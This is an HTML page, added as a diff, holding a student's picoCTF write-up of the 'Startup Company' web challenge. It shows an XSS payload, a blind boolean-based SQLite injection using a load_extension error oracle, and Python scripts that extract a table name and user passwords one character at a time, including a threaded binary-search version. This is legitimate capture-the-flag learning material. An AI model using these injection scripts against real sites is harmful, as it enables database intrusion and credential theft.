@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Pico Startup Company writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="picoCTF, web">
+<meta name="description" content="The last challenge in my Pico Medium Web category - finally - all four pages are finished! It&rsquo;s been quite a while, with 12th grade and university admissions, but I&rsquo;m super proud that I got to it in the end.
+Overview
+Do you want to fund my startup?
+
+We can register, then head over to contribute.php to contribute money. The request looks like captcha=73&amp;moneys=1. We can send negative money but it&rsquo;s not that big of a deal.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/startupcompany-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/startupcompany-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/startupcompany-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Pico Startup Company writeup">
+  <meta property="og:description" content="The last challenge in my Pico Medium Web category - finally - all four pages are finished! It’s been quite a while, with 12th grade and university admissions, but I’m super proud that I got to it in the end.
+Overview Do you want to fund my startup?
+We can register, then head over to contribute.php to contribute money. The request looks like captcha=73&amp;moneys=1. We can send negative money but it’s not that big of a deal.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-22T00:00:00+00:00">
+    <meta property="article:tag" content="PicoCTF">
+    <meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pico Startup Company writeup">
+<meta name="twitter:description" content="The last challenge in my Pico Medium Web category - finally - all four pages are finished! It&rsquo;s been quite a while, with 12th grade and university admissions, but I&rsquo;m super proud that I got to it in the end.
+Overview
+Do you want to fund my startup?
+
+We can register, then head over to contribute.php to contribute money. The request looks like captcha=73&amp;moneys=1. We can send negative money but it&rsquo;s not that big of a deal.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Pico Startup Company writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/startupcompany-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pico Startup Company writeup",
+  "name": "Pico Startup Company writeup",
+  "description": "The last challenge in my Pico Medium Web category - finally - all four pages are finished! It\u0026rsquo;s been quite a while, with 12th grade and university admissions, but I\u0026rsquo;m super proud that I got to it in the end.\nOverview Do you want to fund my startup?\nWe can register, then head over to contribute.php to contribute money. The request looks like captcha=73\u0026amp;moneys=1. We can send negative money but it\u0026rsquo;s not that big of a deal.\n",
+  "keywords": [
+    "picoCTF", "web"
+  ],
+  "articleBody": "The last challenge in my Pico Medium Web category - finally - all four pages are finished! It’s been quite a while, with 12th grade and university admissions, but I’m super proud that I got to it in the end.\nOverview Do you want to fund my startup?\nWe can register, then head over to contribute.php to contribute money. The request looks like captcha=73\u0026moneys=1. We can send negative money but it’s not that big of a deal.\nIdentifying the vulnerabilities Sending a bunch of money in the same interval of time will generate the same captcha, and quickly result in an ‘Invalid Captcha’ error. The hints suggest SQLite, so maybe the captcha is involved in a query.\nUsually sqlmap doesn’t work for me, for some reason, but this time I thought I’d give it a try anyways. No results.\nI tried just removing the captcha value from the request, and it was successful! We can also send an array ([]) or text, and it gets rendered on the page.\nBy sending moneys= we can also achieve XSS. But, these are php pages, so can we do something php specific?\nAfter messing around more, I finally triggered an SQLite3 error:\nI started sending a mix of ’ and “:\nI looked at SQLite Error based payloads from PayloadAllTheThings - and I started using this query: moneys=1' AND CASE WHEN [boolean] THEN 1 ELSE load_extension(1) END;--. This is boolean based gives and will return “Unable to execute statement: not authorized in..” when the boolean query was false.\nUsing that, I found the number of tables, with the boolean query being (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) \u003c 2, the last true one; =\u003e we only have 1 table.\nSame logic, ((SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)\u003c14) =\u003e table name length is 13 chars long.\nThen, to actually figure out the table’s name, I ran this little python script:\nimport requests from utils.prety_print import pretty_print url = \"http://wily-courier.picoctf.net:52189/contribute.php\" cookie = {\"PHPSESSID\":\"d88487e473ccfd64de993d1917f4f422\"} last = True table_name = '' #iterate through letters 1-13 for i in range(1,14): for c in range(ord('A'), ord('z')+1): substr = f\"(SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) \u003e HEX('{chr(c)}')\" qstring = f\"1' AND CASE WHEN ({substr}) THEN 1 ELSE load_extension(1) END;--\" #trimite req, daca c \u003e 'd' true si c \u003e 'e' fals atunci c = 'e' data = { \"moneys\": qstring } res = requests.post(url, data=data, cookies=cookie) current = False if 'not authorized' in res.text else True if last == True and current == False: table_name += chr(c) print(f\"found character: {chr(c)}!\") break last = current print(f\"full table name is {table_name}\") This ran for a couple of minutes, since I didn’t bother using threads, but we finally got the users table name:\nI did the same thing for the admin’s credentials, by updating my script:\nimport requests from utils.pretty_print import pretty_print url = \"http://wily-courier.picoctf.net:52189/contribute.php\" cookie = {\"PHPSESSID\":\"d88487e473ccfd64de993d1917f4f422\"} last = True table_name = 'startup_users' table_len = 13 name_user = 'admin' user_len = 5 pass_user = '' pass_len = 8 #iterate through letters 1-13 for i in range(1,pass_len+1): for c in range(ord('A'), ord('z')+1): substr = f\"(SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) \u003e HEX('{chr(c)}')\" substr_user = f\"(SELECT hex(substr(nameuser,{i},1)) FROM startup_users LIMIT 1 OFFSET 0) \u003e HEX('{chr(c)}')\" substr_pass = f\"(SELECT hex(substr(wordpass,{i},1)) FROM startup_users LIMIT 1 OFFSET 0) \u003e HEX('{chr(c)}')\" qstring = f\"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--\" #trimite req, daca c \u003e 'd' true si c \u003e 'e' fals atunci c = 'e' data = { \"moneys\": qstring } res = requests.post(url, data=data, cookies=cookie) current = False if 'not authorized' in res.text else True if last == True and current == False: pass_user += chr(c) print(f\"found character: {chr(c)}!\") break last = current print(f\"full table name is {table_name}\") print(f\"full admin name is {name_user}\") print(f\"full admin pass is {pass_user}\") And we found that admin has the password password. Wow, great catch! I checked the second user, and it had a 21 letter long password, but that was something beginning with “not_the..” so I gave up.\nI ended up using threads and using binary search to iterate through all of the characters faster, since I decided to just print all of them. After fixing all the issues, and printing only the 6th element, FINALLY:\nThe script is REALLY long:\nimport requests from utils.pretty_print import pretty_print from concurrent.futures import ThreadPoolExecutor import string url = \"http://wily-courier.picoctf.net:65033/contribute.php\" cookie = {\"PHPSESSID\":\"d88487e473ccfd64de993d1917f4f422\"} characters = string.ascii_letters + string.digits + \"{}_\" charset = \"\".join(sorted(characters)) #threads... bc wtf. #find the table row password's len (i being OFFSET) #binary search def find_passlen(i): left = 1 right = 50 while(left\u003c=right): m = int((left+right)/2) substr_len_pass = f\"(SELECT length(wordpass) FROM startup_users LIMIT 1 OFFSET {i})\u003e={m}\" qstring = f\"1' AND CASE WHEN ({substr_len_pass}) THEN 1 ELSE load_extension(1) END;--\" data = { \"moneys\": qstring } res = requests.post(url, data=data, cookies=cookie) current = False if 'not authorized' in res.text else True if current: pos = m left = m + 1 else: right = m - 1 return pos def find_userlen(i): left = 1 right = 30 while(left\u003c=right): m = int((left+right)/2) substr_len_pass = f\"(SELECT length(nameuser) FROM startup_users LIMIT 1 OFFSET {i})\u003e={m}\" qstring = f\"1' AND CASE WHEN ({substr_len_pass}) THEN 1 ELSE load_extension(1) END;--\" data = { \"moneys\": qstring } res = requests.post(url, data=data, cookies=cookie) current = False if 'not authorized' in res.text else True if current: pos = m left = m + 1 else: right = m - 1 return pos def find_passchar(i, k): #find entry k's letter i of the password left = 0 right = len(charset) - 1 while(left\u003c=right): m = int((left+right)/2) c = charset[m] substr_pass = f\"(SELECT hex(substr(wordpass,{i},1)) FROM startup_users LIMIT 1 OFFSET {k}) \u003e= HEX('{c}')\" qstring = f\"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--\" data = { \"moneys\": qstring } res = requests.post(url, data=data, cookies=cookie) current = False if 'not authorized' in res.text else True if current: pos = c left = m+1 else: right=m-1 return pos def find_userchar(i, k): #find entry k's letter i of the password left = 0 right = len(charset) - 1 while(left\u003c=right): m = int((left+right)/2) c = charset[m] substr_pass = f\"(SELECT hex(substr(nameuser,{i},1)) FROM startup_users LIMIT 1 OFFSET {k}) \u003e= HEX('{c}')\" qstring = f\"1' AND CASE WHEN ({substr_pass}) THEN 1 ELSE load_extension(1) END;--\" data = { \"moneys\": qstring } res = requests.post(url, data=data, cookies=cookie) current = False if 'not authorized' in res.text else True if current: pos = c left = m+1 else: right=m-1 return pos def find_pass_user(k): #first find len, then for each char of the len have a thread find it #we have 8 entries passlen = find_passlen(k) userlen = find_userlen(k) print(f\"Found password length {passlen} and username length {userlen} for {k}th user.\") with ThreadPoolExecutor(max_workers=30) as executor: results_pass = list(executor.map(lambda i: find_passchar(i, k), range(1, passlen+1))) results_user = list(executor.map(lambda i: find_userchar(i, k), range(1, userlen+1))) password = ''.join(results_pass) username = ''.join(results_user) print(f\"Found password {password} and {username} for the {k}th user.\") #for each user, make a thread; dar user merge de la k, indexat de la 0 with ThreadPoolExecutor(max_workers=50) as executor: executor.map(find_pass_user, range(0,8)) I looked at some other writeups, and I realised this was not that complicated to solve, and that we could get the server to print rows itself, by sending moneys='||sqlite_version()'. Either way, I feel like doing this myself was a great learning experience and I got to remind myself about binary search, lol.\n",
+  "wordCount" : "1239",
+  "inLanguage": "en",
+  "datePublished": "2026-04-22T00:00:00Z",
+  "dateModified": "2026-04-22T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/startupcompany-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Pico Startup Company writeup
+    </h1>
+    <div class="post-meta"><span title='2026-04-22 00:00:00 +0000 UTC'>April 22, 2026</span>&nbsp;·&nbsp;<span>6 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>The last challenge in my Pico Medium Web category - finally - all four pages are finished! It&rsquo;s been quite a while, with 12th grade and university admissions, but I&rsquo;m super proud that I got to it in the end.</p>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>Do you want to fund my startup?</p>
+<hr>
+<p>We can register, then head over to <code>contribute.php</code> to contribute money. The request looks like <code>captcha=73&amp;moneys=1</code>. We can send negative money but it&rsquo;s not that big of a deal.</p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>Sending a bunch of money in the same interval of time will generate the same captcha, and quickly result in an &lsquo;Invalid Captcha&rsquo; error. The hints suggest SQLite, so maybe the captcha is involved in a query.</p>
+<p>Usually sqlmap doesn&rsquo;t work for me, for some reason, but this time I thought I&rsquo;d give it a try anyways. No results.</p>
+<p>I tried just removing the captcha value from the request, and it was successful! We can also send an array ([]) or text, and it gets rendered on the page.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/startupcompany-writeup/abc.png#center"></p>
+<p>By sending <code>moneys=&lt;script&gt;alert(1)&lt;/script&gt;</code> we can also achieve XSS. But, these are php pages, so can we do something php specific?</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/startupcompany-writeup/xss.png#center"></p>
+<p>After messing around more, I finally triggered an SQLite3 error:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/startupcompany-writeup/db.png#center"></p>
+<p>I started sending a mix of &rsquo; and &ldquo;:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/startupcompany-writeup/wordpass.png#center"></p>
+<p>I looked at SQLite Error based payloads from PayloadAllTheThings - and I started using this query: <code>moneys=1' AND CASE WHEN [boolean] THEN 1 ELSE load_extension(1) END;--</code>. This is boolean based gives and will return <em>&ldquo;Unable to execute statement: not authorized in..&rdquo;</em> when the boolean query was false.</p>
+<p>Using that, I found the number of tables, with the boolean query being <code>(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) &lt; 2</code>, the last true one;  =&gt; we only have 1 table.</p>
+<p>Same logic, <code>((SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)&lt;14)</code> =&gt; table name length is 13 chars long.</p>
+<p>Then, to actually figure out the table&rsquo;s name, I ran this little python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> utils.prety_print <span style="color:#f92672">import</span> pretty_print
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://wily-courier.picoctf.net:52189/contribute.php&#34;</span>
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>:<span style="color:#e6db74">&#34;d88487e473ccfd64de993d1917f4f422&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>last <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>table_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#iterate through letters 1-13</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">14</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(ord(<span style="color:#e6db74">&#39;A&#39;</span>), ord(<span style="color:#e6db74">&#39;z&#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        substr <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT hex(substr(tbl_name,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)) FROM sqlite_master WHERE type=&#39;table&#39; AND tbl_name NOT LIKE &#39;sqlite_%&#39; LIMIT 1 OFFSET 0) &gt; HEX(&#39;</span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        qstring <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1&#39; AND CASE WHEN (</span><span style="color:#e6db74">{</span>substr<span style="color:#e6db74">}</span><span style="color:#e6db74">) THEN 1 ELSE load_extension(1) END;--&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#trimite req, daca c &gt; &#39;d&#39; true si c &gt; &#39;e&#39; fals atunci c = &#39;e&#39;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;moneys&#34;</span>: qstring
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>        current <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;not authorized&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> last <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span> <span style="color:#f92672">and</span> current <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>            table_name <span style="color:#f92672">+=</span> chr(c)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found character: </span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        last <span style="color:#f92672">=</span> current
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;full table name is </span><span style="color:#e6db74">{</span>table_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>This ran for a couple of minutes, since I didn&rsquo;t bother using threads, but we finally got the users table name:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/startupcompany-writeup/res.png#center"></p>
+<p>I did the same thing for the admin&rsquo;s credentials, by updating my script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> utils.pretty_print <span style="color:#f92672">import</span> pretty_print
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://wily-courier.picoctf.net:52189/contribute.php&#34;</span>
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PHPSESSID&#34;</span>:<span style="color:#e6db74">&#34;d88487e473ccfd64de993d1917f4f422&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>last <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>table_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;startup_users&#39;</span>
+</span></span><span style="display:flex;"><span>table_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>name_user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span>user_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>pass_user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>pass_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#iterate through letters 1-13</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,pass_len<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(ord(<span style="color:#e6db74">&#39;A&#39;</span>), ord(<span style="color:#e6db74">&#39;z&#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        substr <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT hex(substr(tbl_name,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)) FROM sqlite_master WHERE type=&#39;table&#39; AND tbl_name NOT LIKE &#39;sqlite_%&#39; LIMIT 1 OFFSET 0) &gt; HEX(&#39;</span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        substr_user <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT hex(substr(nameuser,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)) FROM startup_users LIMIT 1 OFFSET 0) &gt; HEX(&#39;</span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        substr_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;(SELECT hex(substr(wordpass,</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)) FROM startup_users LIMIT 1 OFFSET 0) &gt; HEX(&#39;</span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        qstring <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1&#39; AND CASE WHEN (</span><span style="color:#e6db74">{</span>substr_pass<span style="color:#e6db74">}</span><span style="color:#e6db74">) THEN 1 ELSE load_extension(1) END;--&#34;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#trimite req, daca c &gt; &#39;d&#39; true si c &gt; &#39;e&#39; fals atunci c = &#39;e&#39;</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;moneys&#34;</span>: qstring
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>        current <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;not authorized&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> last <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span> <span style="color:#f92672">and</span> current <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>            pass_user <span style="color:#f92672">+=</span> chr(c)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found character: </span><span style="color:#e6db74">{</span>chr(c)<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        last <span style="color:#f92672">=</span> current
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;full table name is </span><span style="color:#e6db74">{</span>table_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;full admin name is </span><span style="color:#e6db74">{</span>name_user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;full admin pass is </span><span style="color:#e6db74">{</span>pass_user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
